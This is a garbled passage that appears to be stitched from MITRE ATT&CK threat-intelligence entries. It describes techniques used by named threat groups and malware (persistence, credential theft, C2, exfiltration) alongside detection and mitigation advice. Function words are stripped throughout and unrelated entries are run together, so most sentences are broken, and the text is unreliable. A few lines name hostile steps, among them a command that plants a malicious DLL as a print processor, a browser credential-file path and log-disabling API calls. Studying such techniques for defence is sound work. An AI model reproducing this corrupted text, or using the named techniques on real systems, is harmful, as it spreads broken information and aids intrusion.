operations (execution, copies, etc.) file names colons. syntax (ex: <code>file.ext:ads[.ext]</code>) commonly ADSs. (Citation: ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) exhaustive list utilities execute create ADSs, https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f. [PLATINUM](https://attack.mitre.org/groups/G0068) capable Windows hook interfaces gathering credential access.(Citation: PLATINUM April 2016) Suspicious program execution services outlier processes compared historical data. abnormal process trees services execution commands relate Discovery adversary techniques. Data events viewed isolation, chain behavior lead activities, network connections Command Control, learning details environment Discovery, Lateral Movement. Responses [Pisloader](https://attack.mitre.org/software/S0124) C2 server base32-encoded.(Citation: Palo Alto DNS Requests) (Citation: FireEye APT39 Jan 2019)(Citation: Dark Reading APT39 JAN 2019) [Proxysvc](https://attack.mitre.org/software/S0238) automatically collects data victim sends control server.(Citation: McAfee GhostSecret) [Volgmer](https://attack.mitre.org/software/S0180) executes payloads Windows API CreateProcessW().(Citation: US-CERT Volgmer 2 Nov 2017) RDP legitimate, depending network environment used. factors, access patterns activity occurs remote login, suspicious malicious behavior RDP. Scan images deployment, block compliance security policies. Kubernetes environments, admission controller validate images container deployment request authenticated container deployed.(Citation: Kubernetes Hardening Guide) [Andariel](https://attack.mitre.org/groups/G0138) limited watering hole attacks specific IP address ranges.(Citation: AhnLab Andariel Subgroup Lazarus June 2018) [Remsec](https://attack.mitre.org/software/S0125) capable ICMP, TCP, UDP C2.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report) [ZxxZ](https://attack.mitre.org/software/S1013) encoded avoid detection static analysis tools.(Citation: Cisco Talos Bitter Bangladesh 2022) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware families collect type version victim OS, victim CPU information. Destover-like variant [Lazarus Group](https://attack.mitre.org/groups/G0032) collects disk space sends C2 server.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret)(Citation: Lazarus APT January 2022) [Ember Bear](https://attack.mitre.org/groups/G1003) executed batch script designed disable Windows Defender compromised host.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) (Citation: FireEye APT32 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)(Citation: Volexity Ocean Lotus November 2020)(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019) [Keydnap](https://attack.mitre.org/software/S0276) resource fork macOS JPEG file icon executable's icon assigned operating system.(Citation: OSX Keydnap malware) VNC defaults TCP ports 5900 server, 5800 browser access, 5500 viewer listening mode. Filtering blocking ports inhibit VNC traffic utilizing default ports. [PcShare](https://attack.mitre.org/software/S1050) encrypted XOR 32-long Base16 strings compressed LZW algorithm.(Citation: Bitdefender FunnyDream Campaign November 2020) [Hi-Zor](https://attack.mitre.org/software/S0087) creates Registry key establish persistence.(Citation: Fidelis INOCNATION) Monitor API calls (such <code>NetUserEnum()</code>) attempt gather local accounts type user, privileges groups. [APT29](https://attack.mitre.org/groups/G0016) extracted files compromised networks.(Citation: Volexity SolarWinds)  [APT32](https://attack.mitre.org/groups/G0050) legitimately-signed executables Symantec McAfee load malicious DLL. side-loads backdoor dropping library legitimate, signed executable (AcroTranscoder).(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)(Citation: ESET OceanLotus Mar 2019) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors established domains operational infrastructure.(Citation: Cylance Dust Storm) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) malicious documents exploits CVE-2021-40444 MSHTML.(Citation: Google EXOTIC LILY March 2022) [Leviathan](https://attack.mitre.org/groups/G0065) established domains impersonate legitimate entities targeting efforts. (Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019) [Wizard Spider](https://attack.mitre.org/groups/G0102) stolen credentials tools <code>%TEMP%</code> directory domain controllers.(Citation: CrowdStrike Grim Spider 2019) [Turla](https://attack.mitre.org/groups/G0010) Javascript backdoor local_update_check Registry key <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> establish persistence. Additionally, [Turla](https://attack.mitre.org/groups/G0010) custom executable Metasploit shellcode saved Startup folder gain persistence.(Citation: ESET Turla Mosquito Jan 2018)(Citation: ESET Turla Mosquito 2018) Applications appliances utilize default username password changed installation, deployment production environment. (Citation: US-CERT Alert TA13-175A Risks Default Passwords Internet) possible, applications SSH updated periodically properly secured. [UBoatRAT](https://attack.mitre.org/software/S0333) takes advantage /SetNotifyCmdLine option [BITSAdmin](https://attack.mitre.org/software/S0190) ensure stays running maintain persistence.(Citation: PaloAlto UBoatRAT Nov 2017) [Stuxnet](https://attack.mitre.org/software/S0603) propagates MS10-061 Print Spooler MS08-067 Windows Server Service vulnerabilities.(Citation: Symantec W.32 Stuxnet Dossier) [APT19](https://attack.mitre.org/groups/G0073) downloaded launched code SCT file.(Citation: FireEye APT19) [UPPERCUT](https://attack.mitre.org/software/S0275) capture desktop screenshots PNG format send C2 server.(Citation: FireEye APT10 Sept 2018) Monitor executed command arguments exfiltrate data code repository primary command control channel. [REvil](https://attack.mitre.org/software/S0496) exfiltrate host malware C2 servers.(Citation: Secureworks REvil September 2019) (Citation: Palo Alto Gamaredon Feb 2017)(Citation: Symantec Shuckworm January 2022)(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022)(Citation: Secureworks IRON TILDEN Profile) [Derusbi](https://attack.mitre.org/software/S0021) variants Registry persistence proxy execution regsvr32.exe.(Citation: ThreatGeek Derusbi Converge) [Peppy](https://attack.mitre.org/software/S0643) ability execute commands.(Citation: Proofpoint Operation Transparent Tribe March 2016) Monitor executed commands arguments steal data exfiltrating protocol existing command control channel. [Ember Bear](https://attack.mitre.org/groups/G1003) PowerShell download execute malicious code.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Monitor newly created logons credentials events review discrepancies. Unusual remote logins correlate suspicious activity (such writing executing binaries) malicious activity. [Lazarus Group](https://attack.mitre.org/groups/G0032) targeted specific individuals organization tailored job vacancy announcements.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020) [QuasarRAT](https://attack.mitre.org/software/S0262) determine country victim host located in.(Citation: CISA AR18-352A Quasar RAT December 2018) [IceApple](https://attack.mitre.org/software/S1022) delete files directories targeted systems.(Citation: CrowdStrike IceApple 2022) [Zebrocy](https://attack.mitre.org/software/S0251) installs application-defined Windows hook notified network drive attached, hook RecordToFile file stealing method.(Citation: Securelist Sofacy Feb 2018) [FELIXROOT](https://attack.mitre.org/software/S0267) queries Registry specific potential privilege escalation proxy information. [FELIXROOT](https://attack.mitre.org/software/S0267) WMI query Windows Registry.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) [Babuk](https://attack.mitre.org/software/S0638) specific services backups.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: Trend Micro Ransomware February 2021) [Flagpro](https://attack.mitre.org/software/S0696) execute malicious VBA macros embedded .xlsm files.(Citation: NTT Security Flagpro December 2021) [FatDuke](https://attack.mitre.org/software/S0512) collect user name, Windows version, name, space discs compromised host.(Citation: ESET Dukes October 2019) [Darkhotel](https://attack.mitre.org/groups/G0012) embedded iframes hotel login portals redirect selected victims download malware.(Citation: Kaspersky Darkhotel) [yty](https://attack.mitre.org/software/S0248) basic anti-sandbox detection detect Virtual PC, Sandboxie, VMware. (Citation: ASERT Donot March 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors exfiltrated files directories targeted system.(Citation: FoxIT Wocao December 2019)  [APT41](https://attack.mitre.org/groups/G0096) <code>net share</code> command network reconnaissance.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [Gelsemium](https://attack.mitre.org/software/S0666) junk code generate random activity obscure malware behavior.(Citation: ESET Gelsemium June 2021) [APT3](https://attack.mitre.org/groups/G0022) downloader establishes SOCKS5 connections initial C2.(Citation: FireEye Operation Double Tap) [Taidoor](https://attack.mitre.org/software/S0011) collected MAC address compromised host; <code>GetAdaptersInfo</code> identify network adapters.(Citation: TrendMicro Taidoor)(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [WellMess](https://attack.mitre.org/software/S0514) ability DNS tunneling C2 communications.(Citation: PWC WellMess July 2020)(Citation: NCSC APT29 July 2020) possible, include hash values manifest files prevent side-loading malicious libraries.(Citation: FireEye DLL Side-Loading) (Citation: Cisco 72)(Citation: Novetta-Axiom) [TeamTNT](https://attack.mitre.org/groups/G0139) searched rival malware removes found.(Citation: Trend Micro TeamTNT) [TeamTNT](https://attack.mitre.org/groups/G0139) searched running processes strings aliyun liyun identify machines running Alibaba Cloud Security tools.(Citation: Cisco Talos Intelligence Group) Monitor newly constructed files execute malicious payloads hijacking operating systems programs. Monitor newly executed processes establish persistence elevate privileges executing malicious content triggered accessibility features. [Rising Sun](https://attack.mitre.org/software/S0448) decrypted single-byte XOR scheme. Additionally, [Rising Sun](https://attack.mitre.org/software/S0448) decrypt configuration data runtime.(Citation: McAfee Sharpshooter December 2018)	 [MacMa](https://attack.mitre.org/software/S1016) installs `com.apple.softwareupdate.plist` file `/LaunchAgents` folder `RunAtLoad` set `true`. user login, [MacMa](https://attack.mitre.org/software/S1016) executed `/var/root/.local/softwareupdate` root privileges. variations include `LimitLoadToSessionType` key `Aqua`, ensuring [MacMa](https://attack.mitre.org/software/S1016) runs logged GUI user.(Citation: ESET DazzleSpy Jan 2022)(Citation: Objective-See MacMa Nov 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) exfiltrated stolen data Dropbox customized version dbxcli.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020) Audit local accounts permission levels routinely situations adversary gain wide access obtaining credentials privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Privilege) audits check local accounts created authorized. Implementing LAPS prevent reuse local administrator credentials domain.(Citation: Remote Local) [Industroyer](https://attack.mitre.org/software/S0604) downloads shellcode payload remote C2 server loads memory.(Citation: ESET Industroyer) [Astaroth](https://attack.mitre.org/software/S0373) checks presence Avast antivirus <code>C:\Program\Files\</code> folder. (Citation: Cofense Astaroth Sept 2018) sudoers file strictly edited passwords required users spawn risky processes users privilege. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) script main executable app bundle drops embedded base64-encoded payload <code>/tmp</code> folder.(Citation: Trend Micro MacOS Backdoor November 2020)(Citation: sentinelone apt32 macOS backdoor 2020) [esentutl](https://attack.mitre.org/software/S0404) Volume Shadow locked files ntds.dit.(Citation: LOLBAS Esentutl)(Citation: Cary Esentutl) [Deep Panda](https://attack.mitre.org/groups/G0009) regsvr32.exe execute server variant [Derusbi](https://attack.mitre.org/software/S0021) victim networks.(Citation: RSA Crew) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [Javali](https://attack.mitre.org/software/S0528) monitor processes browsers custom banking applications.(Citation: Securelist Brazilian Banking Malware July 2020) [Cuba](https://attack.mitre.org/software/S0625) <code>cmd.exe /c</code> batch files execution.(Citation: McAfee Cuba April 2021)  [Winnti Windows](https://attack.mitre.org/software/S0141) communicate custom TCP.(Citation: Novetta Winnti April 2015) (Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) modified TeamViewer client command control channel.(Citation: Securelist Kimsuky Sept 2013)(Citation: Crowdstrike GTR2020 Mar 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) executed PowerShell commands batch scripts.(Citation: ATT TeamTNT Chimaera September 2020) [Andariel](https://attack.mitre.org/groups/G0138) watering hole attacks, zero-day exploits, gain initial access victims specific IP range.(Citation: AhnLab Andariel Subgroup Lazarus June 2018)(Citation: TrendMicro Andariel Tactics July 2018) Require signed binaries. (Citation: Tarrask scheduled task) auditing tools capable detecting privilege service abuse opportunities systems enterprise correct them.  Monitor network traffic uncommon data flows [Valid Accounts](https://attack.mitre.org/techniques/T1078) log Remote Desktop Protocol (RDP). [OilRig](https://attack.mitre.org/groups/G0049) PowerShell scripts execution, including macro PowerShell command decode file contents.(Citation: FireEye APT34 Dec 2017)(Citation: OilRig Delivery Oct 2017)(Citation: Crowdstrike Helix Kitten Nov 2018) (Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021) [Earth Lusca](https://attack.mitre.org/groups/G1006) command `move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll` register malicious DLL Windows print processor, eventually loaded Print Spooler service.(Citation: TrendMicro EarthLusca 2022) Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level.  user local administrator multiple systems. [TrickBot](https://attack.mitre.org/software/S0266) non-descriptive names hide functionality AES CBC (256 bits) encryption algorithm loader configuration files.(Citation: S2 Grupo TrickBot June 2017) [Higaisa](https://attack.mitre.org/groups/G0126) malicious e-mail attachments lure victims executing LNK files.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) [MobileOrder](https://attack.mitre.org/software/S0079) exfiltrates data C2 server protocol C2 communications.(Citation: Scarlet Mimic Jan 2016) [JPIN](https://attack.mitre.org/software/S0201) enumerate drives types. change file permissions cacls.exe.(Citation: PLATINUM April 2016) [Mis-Type](https://attack.mitre.org/software/S0084) saves file named `msdtc.exe`, legitimate Distributed Transaction Coordinator service binary.(Citation: Cylance Dust Storm)(Citation: DTC) [Azorult](https://attack.mitre.org/software/S0344) steal credentials victim's browser.(Citation: Unit42 Azorult Nov 2018) [Crimson](https://attack.mitre.org/software/S0115) decode encoded file prior execution.(Citation: Proofpoint Operation Transparent Tribe March 2016) [InvisiMole](https://attack.mitre.org/software/S0260) capture keystrokes compromised host.(Citation: ESET InvisiMole June 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware enumerates logged-on users.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: SentinelOne Lazarus macOS July 2020)(Citation: Lazarus APT January 2022) [NETWIRE](https://attack.mitre.org/software/S0198) binary executed PowerShell script.(Citation: FireEye NETWIRE March 2019) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors upload files victim machines.(Citation: ESET Turla PowerShell 2019) Monitor processes abnormal behavior indicative DDE abuse, Office applications loading DLLs modules typically application applications spawning unusual processes (such cmd.exe). Monitor logs API calls disable logging. AWS, monitor for: <code>StopLogging</code> <code>DeleteTrail</code>.(Citation: Stopping CloudTrail Sending Events CloudWatch Logs) GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs) Azure, monitor <code>az monitor diagnostic-settings delete</code>.(Citation: monitor diagnostic-settings) Additionally, sudden loss log source disabled. [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors password cracking pass-the-hash tools discover usernames passwords.(Citation: McAfee Night Dragon) [FIN8](https://attack.mitre.org/groups/G0061) WMI event subscriptions persistence.(Citation: Bitdefender FIN8 July 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) acquired legitimate credentials prior attacks.(Citation: US-CERT Ukraine Feb 2016) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) dropped implants folders named legitimate software.(Citation: ESET BackdoorDiplomacy Jun 2021) (Citation: Check APT35 CharmPower January 2022) [ZLib](https://attack.mitre.org/software/S0086) ability enumerate files drives.(Citation: Cylance Dust Storm) [BADNEWS](https://attack.mitre.org/software/S0128) monitors USB devices copies files extensions predefined directory.(Citation: TrendMicro Patchwork Dec 2017) [Bumblebee](https://attack.mitre.org/software/S1039) identify specific analytical tools based running processes.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)(Citation: Medium Ali Salem Bumblebee April 2022)  [SombRAT](https://attack.mitre.org/software/S0615) ability <code>cancel</code> <code>closeanddeletestorage</code> remove files storage delete storage temp file compromised host.(Citation: BlackBerry CostaRicto November 2020) module [Prikormka](https://attack.mitre.org/software/S0113) gathers logins passwords stored applications victims, including Google Chrome, Mozilla Firefox, browsers.(Citation: ESET Operation Groundbait) Windows Policy manage root certificates <code>Flags</code> <code>HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\ProtectedRoots</code> set 1 prevent non-administrator users root installations HKCU certificate store. (Citation: SpectorOps Code Signing Dec 2017) [APT29](https://attack.mitre.org/groups/G0016) credentials OAuth Applications Service Principals.(Citation: - Customer Guidance Nation-State Cyber Attacks)(Citation: CrowdStrike StellarParticle January 2022) [Rancor](https://attack.mitre.org/groups/G0075) attempted users embedded macro Office Excel document launch malware.(Citation: Rancor Unit42 June 2018) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [DRATzarus](https://attack.mitre.org/software/S0694) `IsDebuggerPresent` detect debugger victim.(Citation: ClearSky Lazarus Aug 2020) [Bandook](https://attack.mitre.org/software/S0234) detect USB devices.(Citation: EFF Manul Aug 2016) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) rundll32 execution compromised hosts.(Citation: Gigamon Berserk Bear October 2021) endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [Bazar](https://attack.mitre.org/software/S0534) inject target process process doppelgänging.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [FIN7](https://attack.mitre.org/groups/G0046) application shim databases persistence.(Citation: FireEye FIN7 Shim Databases) [KGH_SPY](https://attack.mitre.org/software/S0526) masqueraded legitimate Windows tool.(Citation: Cybereason Kimsuky November 2020) [build_downer](https://attack.mitre.org/software/S0471) Registry key "NVIDIA" legitimate.(Citation: Trend Micro Tick November 2019) [VERMIN](https://attack.mitre.org/software/S0257) collects data stored clipboard.(Citation: Unit 42 VERMIN Jan 2018) Monitor suspicious files .pdf, .docx, .jpg, etc.) viewed isolation steal data exfiltrating existing command control channel. [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers read data files.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [Reaver](https://attack.mitre.org/software/S0172) encrypts files XOR.(Citation: Palo Alto Reaver Nov 2017) domain joined, policy restrict ability create hide users. Similarly, preventing modification <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> force users visible. [SpicyOmelette](https://attack.mitre.org/software/S0646) distributed emails malicious link appears PDF document.(Citation: Secureworks GOLD KINGSWOOD September 2018) [Dyre](https://attack.mitre.org/software/S0024) injects processes load modules.(Citation: Symantec Dyre June 2015) [REvil](https://attack.mitre.org/software/S0496) capability services kill processes.(Citation: Intel 471 REvil March 2020)(Citation: Secureworks REvil September 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors collected clipboard data plaintext.(Citation: FoxIT Wocao December 2019) multi-factor authentication user privileged accounts. [Gorgon Group](https://attack.mitre.org/groups/G0078) malware cmd.exe download execute payloads execute commands system.(Citation: Unit 42 Gorgon Aug 2018) [Bad Rabbit](https://attack.mitre.org/software/S0606) masqueraded Flash Player installer executable file <code>install_flash_player.exe</code>.(Citation: ESET Bad Rabbit)(Citation: Secure List Bad Rabbit) [Grandoreiro](https://attack.mitre.org/software/S0531) determine time victim machine IPinfo.(Citation: ESET Grandoreiro April 2020) [CSPY Downloader](https://attack.mitre.org/software/S0527) schtasks utility bypass UAC.(Citation: Cybereason Kimsuky November 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) emails malicious attachments gain initial access.(Citation: Gigamon Berserk Bear October 2021) [Hildegard](https://attack.mitre.org/software/S0601) searched SSH keys, Docker credentials, Kubernetes service tokens.(Citation: Unit 42 Hildegard Malware) (Citation: Überwachung APT28 Forfiles June 2015) [Explosive](https://attack.mitre.org/software/S0569) scan .exe files located USB drive.(Citation: CheckPoint Volatile Cedar March 2015)  Monitor executed commands arguments hidden windows conceal malicious activity plain sight users. Windows, enable configure event logging PowerShell logging check hidden window style. [menuPass](https://attack.mitre.org/groups/G0045) dynamic DNS service providers host malicious domains.(Citation: District Court NY APT10 Indictment December 2018) [CharmPower](https://attack.mitre.org/software/S0674) retrieve C2 domain actor-controlled S3 buckets.(Citation: Check APT35 CharmPower January 2022) (Citation: Symantec Elderwood Sept 2012) [Industroyer](https://attack.mitre.org/software/S0604) enumerate remote computers compromised network.(Citation: ESET Industroyer) [Bazar](https://attack.mitre.org/software/S0534)'s loader delete scheduled tasks created previous instance malware.(Citation: NCC Team9 June 2020) [Avenger](https://attack.mitre.org/software/S0473) ability identify installed anti-virus products compromised host.(Citation: Trend Micro Tick November 2019) [GrimAgent](https://attack.mitre.org/software/S0632) base64 encode C2 replies.(Citation: IB GrimAgent July 2021) [Pteranodon](https://attack.mitre.org/software/S0147) C2.(Citation: Palo Alto Gamaredon Feb 2017) [FIN4](https://attack.mitre.org/groups/G0085) Tor log victims' email accounts.(Citation: FireEye Hacking FIN4 Dec 2014) [Equation](https://attack.mitre.org/groups/G0020) capability overwrite firmware hard drives manufacturers.(Citation: Kaspersky Equation QA) [ROADTools](https://attack.mitre.org/software/S0684) enumerate Azure users.(Citation: Roadtools) [Lazarus Group](https://attack.mitre.org/groups/G0032) changed memory protection permissions overwritten memory DLL function code shellcode, executed [KernelCallbackTable](https://attack.mitre.org/techniques/T1574/013) hijacking. [Lazarus Group](https://attack.mitre.org/groups/G0032) shellcode macros decrypt manually map DLLs memory runtime.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers Address Resolution Protocol (ARP) table victim.(Citation: Citizen Lab Stealth Falcon 2016) [DarkWatchman](https://attack.mitre.org/software/S0673) collect time zone system.(Citation: Prevailion DarkWatchman 2021) [ABK](https://attack.mitre.org/software/S0469) ability communications C2.(Citation: Trend Micro Tick November 2019) Identify browser files credentials Google Chrome’s Login Data database file: <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>. Monitor file read events browser files credentials, reading process unrelated subject browser. [APT28](https://attack.mitre.org/groups/G0007) newly-created Blogspot credential harvesting operations.(Citation: Google TAG Ukraine Threat Landscape March 2022) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors loaded DLLs `rundll32` `svchost` process.(Citation: DFIR Conti Bazar Nov 2021) Limit service accounts minimal required privileges, including membership privileged Domain Administrators.(Citation: AdSecurity Cracking Kerberos Dec 2015) Monitor newly constructed files establish persistence executing malicious content triggered user inactivity. encrypting reduce adversary’s ability perform tailored data modifications. [AADInternals](https://attack.mitre.org/software/S0677) register device Azure AD.(Citation: AADInternals Documentation) [netsh](https://attack.mitre.org/software/S0108) disable local firewall settings.(Citation: TechNet Netsh)(Citation: TechNet Netsh Firewall) [Torisma](https://attack.mitre.org/software/S0678) XOR Base64 decode C2 data.(Citation: McAfee Lazarus Nov 2020) [FLASHFLOOD](https://attack.mitre.org/software/S0036) searches files (either default customized set file extensions) local removable media.(Citation: FireEye APT30) [DustySky](https://attack.mitre.org/software/S0062) compress files RAR staging data exfiltrated.(Citation: Kaspersky MoleRATs April 2019) [Skidmap](https://attack.mitre.org/software/S0468) ability install loadable kernel modules (LKMs) infected machines.(Citation: Trend Micro Skidmap) [PowerDuke](https://attack.mitre.org/software/S0139) command write random data file delete it.(Citation: Volexity PowerDuke November 2016) (Citation: PWC Cloud Hopper Technical Annex April 2017) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) remote monitoring management tool ConnectWise screen captures victim's machines.(Citation: Tetra Defense Sodinokibi March 2020) Monitor dynamic libraries loaded. path dependent libraries include LC_LOAD_DYLIB, LC_LOAD_WEAK_DYLIB, LC_RPATH. special keywords recognized macOS loader @rpath, @loader_path, @executable_path.(Citation: Apple Developer Doco Archive Run-Path) loader instructions examined individual binaries frameworks otool -l command. Objective-See's Dylib Hijacking Scanner identify applications vulnerable dylib hijacking [menuPass](https://attack.mitre.org/groups/G0045) renamed [certutil](https://attack.mitre.org/software/S0160) moved location avoid detection based tool.(Citation: FireEye APT10 Sept 2018) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) wmic.exe set environment variables.(Citation: RedCanary Mockingbird 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) queried AWS instance metadata service credentials.(Citation: Trend Micro TeamTNT)(Citation: Cisco Talos Intelligence Group) verification distributed binaries hash checking integrity checking mechanisms. Scan downloads malicious signatures attempt software updates prior deployment note potential suspicious activity. [APT29](https://attack.mitre.org/groups/G0016) valid accounts, including administrator accounts, facilitate lateral movement compromised networks.(Citation: ESET Dukes October 2019)(Citation: NCSC APT29 July 2020)(Citation: CrowdStrike StellarParticle January 2022) Check integrity existing BIOS EFI determine vulnerable modification. Trusted Platform Module technology. (Citation: TCG Trusted Platform Module) [XCSSET](https://attack.mitre.org/software/S0658) builds malicious application bundle resemble Safari Safari icon <code>Info.plist</code>. (Citation: trendmicro xcsset xcode project 2020) [Valak](https://attack.mitre.org/software/S0476) executed Word documents malicious macros.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020) [Gelsemium](https://attack.mitre.org/software/S0666) ability store components Registry.(Citation: ESET Gelsemium June 2021) (Citation: Checkpoint IndigoZebra July 2021) [Siloscape](https://attack.mitre.org/software/S0623) Tor communicate C2.(Citation: Unit 42 Siloscape Jun 2021) Monitor API calls SetWindowsHook, GetKeyState, GetAsyncKeyState.(Citation: Adventures Keystroke) common keylogging API calls. API calls indicator keylogging, provide behavioral data combined files written disk unusual processes. disabling restricting NTLM.(Citation: Disable NTLM Nov 2012) disabling WDigest authentication.(Citation: WDigest Mit) (Citation: Citizen Lab Group5) [LitePower](https://attack.mitre.org/software/S0680) screenshots save `%AppData%`.(Citation: Kaspersky WIRTE November 2021) [Remsec](https://attack.mitre.org/software/S0125) ping traceroute remote host.(Citation: Kaspersky ProjectSauron Technical Analysis) (Citation: MSTIC FoggyWeb September 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) mimic protocol C2 communication, hiding actual data header, URI parameter, transaction body, appending URI.(Citation: Cobalt Strike Manual 4.3 November 2020) [esentutl](https://attack.mitre.org/software/S0404) read write alternate data streams.(Citation: LOLBAS Esentutl) [POWRUNER](https://attack.mitre.org/software/S0184) collect logged user running <code>whoami</code> victim.(Citation: FireEye APT34 Dec 2017) Monitor suspicious account behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times business hours. Activity interactive login sessions process ownership accounts execute binaries remote account.  [FELIXROOT](https://attack.mitre.org/software/S0267) HTTPS communicate C2 server.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) [TajMahal](https://attack.mitre.org/software/S0467) ability compress files send queue exfiltration.(Citation: Kaspersky TajMahal April 2019) [Trojan.Karagany](https://attack.mitre.org/software/S0094) steal data credentials browsers.(Citation: Secureworks Karagany July 2019) [WastedLocker](https://attack.mitre.org/software/S0612) modify registry values <code>Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap</code> registry key.(Citation: NCC WastedLocker June 2020) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover Windows Registry <code>reg query</code> command.(Citation: Kaspersky Turla) [Turla](https://attack.mitre.org/groups/G0010) retrieved PowerShell payloads hidden Registry checking session named pipes .(Citation: ESET Turla PowerShell 2019) [Trojan.Karagany](https://attack.mitre.org/software/S0094) [Tasklist](https://attack.mitre.org/software/S0057) collect list running tasks.(Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019) Monitor processes command-lines install modify login hooks, processes spawned user login hooks. [Sandworm Team](https://attack.mitre.org/groups/G0034) script attempt RPC authentication hosts.(Citation: Dragos Crashoverride 2018)  [Anchor](https://attack.mitre.org/software/S0504) execute payloads scripting.(Citation: Medium Anchor DNS July 2020) Monitor network traffic unusual ARP traffic, gratuitous ARP replies suspicious. collecting ARP caches endpoints signs ARP poisoning. example, multiple IP addresses map single MAC address, indicator ARP cache poisoned. [FIN7](https://attack.mitre.org/groups/G0046) spear phishing campaigns included malicious Word documents DDE execution.(Citation: CyberScoop FIN7 Oct 2017) Monitor third-party application logging, messaging, artifacts leverage Office-based applications persistence startups. SensePost, tool [Ruler](https://attack.mitre.org/software/S0358) carry malicious rules, forms, attacks, released tool detect Ruler usage.(Citation: SensePost NotRuler) [MoonWind](https://attack.mitre.org/software/S0149) completes network communication raw sockets.(Citation: Palo Alto MoonWind March 2017) blocking download/transfer execution uncommon file types adversary campaigns, CHM files [BlackTech](https://attack.mitre.org/groups/G0098) exploited buffer overflow vulnerability Internet Services (IIS) 6.0, CVE-2017-7269, establish command control (C2) server.(Citation: TrendMicro BlackTech June 2017) [Smoke Loader](https://attack.mitre.org/software/S0226) adds Registry key persistence adds script Startup folder deploy payload.(Citation: Malwarebytes SmokeLoader 2016) 